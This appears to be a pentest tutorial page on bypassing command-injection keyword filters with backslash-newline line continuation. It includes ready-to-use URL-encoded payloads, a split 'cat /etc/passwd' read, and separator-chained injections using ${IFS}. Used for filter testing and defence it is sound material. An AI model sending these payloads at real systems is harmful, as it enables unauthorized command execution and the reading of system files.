---
title: "Backslash-newline line continuation to split a command across lines"
description: "Using backslash followed by a newline to break a keyword or command across physical lines so a literal blocklist misses it while the shell rejoins and executes it."
keywords:
  - command injection
  - line continuation
  - backslash newline
  - filter bypass
  - keyword splitting
---

# Backslash + newline continuation

A backslash immediately followed by a newline is a **line continuation**: the shell removes both characters and joins the two physical lines into one logical line before any other parsing. This gives an attacker a way to split a filtered keyword—or a whole command—across lines so that no blocked token appears contiguously in the raw input, while the shell silently reassembles it at runtime.

> **Scope.** For authorized penetration tests, red-team engagements, and CTF labs against systems you own or are contracted to assess. Unauthorized use is unlawful.

## Why the shell erases the split

During tokenization the shell processes `\<newline>` first, deleting the pair entirely. The sequence `who\<newline>ami` therefore becomes the single word `whoami` *before* the shell decides what is a command name. A filter that matches the literal string `whoami`, or that inspects each line independently, sees only `who` and `ami` and lets the request through.

## Payloads

In an HTTP request the newline is URL-encoded as `%0a`; the backslash is `%5c` or a literal `\`:

```
who\%0aami
id\%0a
\%0awhoami
```

As raw bytes the payload is a backslash at end of line:

```
who\
ami
```

The shell joins these into `whoami`.

## Splitting a full command and its arguments

Continuation can break any position, including inside a path, letting you hide `cat /etc/passwd` from a signature:

```
ca\
t /et\
c/pa\
sswd
```

Each backslash-newline is deleted, yielding `cat /etc/passwd`.

## Combining with separators

The continuation only hides a keyword; you still need to start the second command. Pair it with a newline terminator or an allowed separator, and with a space substitute if spaces are blocked:

```
127.0.0.1%0awho\%0aami
127.0.0.1;ca\%0at${IFS}/etc/passwd
```

## Context notes

- This is a **shell** technique: the string must reach `sh -c`, `system()`, or backticks, where continuation is honored.
- Backslash-continuation differs from plain backslash keyword splitting (`w\ho\ami`): there the backslash escapes the next *character*; here it specifically escapes the *newline* to fold lines together.
- `cmd.exe` uses `^` at end of line for continuation rather than `\`.

## References

- [PayloadsAllTheThings: Command Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Command%20Injection)
